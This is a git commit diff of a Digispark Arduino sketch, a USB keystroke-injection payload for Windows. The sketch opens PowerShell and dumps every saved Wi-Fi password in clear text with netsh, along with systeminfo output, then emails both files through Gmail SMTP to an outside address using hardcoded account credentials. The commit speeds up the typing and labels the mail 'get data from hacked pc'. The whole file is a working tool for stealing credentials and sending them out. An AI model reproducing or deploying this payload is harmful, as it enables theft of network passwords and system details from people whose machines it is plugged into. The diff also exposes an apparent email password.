efb637349e7b7c2265170651c5df8c357513c642
Oğulcan KAÇAR <63792003+OgulcanKacarr@users.noreply.github.com>
2022-04-10 15:15:38 +0300

    Update DigisparkWifiMailler.ino

--- DigisparkWifiMailler.ino
+++ DigisparkWifiMailler.ino
@@ -11,7 +11,7 @@ void setup() {
   pinMode(1, OUTPUT); //LED on Model A  or Pro
 
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(200);
 }
 
 void loop() {
@@ -19,69 +19,71 @@ void loop() {
   if (limit > current) {
 
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(200);
     DigiKeyboard.print("powershell");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(200);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(200);
 
     //saveInfo
     DigiKeyboard.print("netsh wlan show profile name=\'*\' key=clear > pass.txt");
-    DigiKeyboard.delay(1000);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(200);
     DigiKeyboard.print("systeminfo > sysinfo.txt");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(200);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(200);
 
     //sendMail
     DigiKeyboard.print(F("$Message = New-Object System.Net.Mail.MailMessage 'cyberoz.system@gmail.com','oglcnkcr54_kcr@outlook.com'"));
     DigiKeyboard.delay(1000);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
-    DigiKeyboard.print("$Message.Subject = 'GetInfoForDigi'");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
+    DigiKeyboard.print("$Message.Subject = 'Get Info For Digi'");
+    DigiKeyboard.delay(10);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
-    DigiKeyboard.print("$Message.Body = 'Bilgisayardan gelen bilgiler'");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
+    DigiKeyboard.print("$Message.Body = 'get data from hacked pc'");
+    DigiKeyboard.delay(10);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.print("$Message.Attachments.Add('sysinfo.txt')");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.print("$Message.Attachments.Add('pass.txt')");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.print("$Smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', '587')");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.print("$Smtp.EnableSsl = $true");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.print(F("$Smtp.Credentials = New-Object System.Net.NetworkCredential('cyberoz.system@gmail.com', 'Cyber1.1')"));
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.print("$Smtp.Send($Message)");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(10);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(2000);
+    DigiKeyboard.delay(10);
+    DigiKeyboard.print("exit");
+    DigiKeyboard.delay(10);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-
- 
     //isFinish
     digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
     digitalWrite(1, HIGH);
    
    
-
     current = current + 1;
+
+    
   }
 
 }
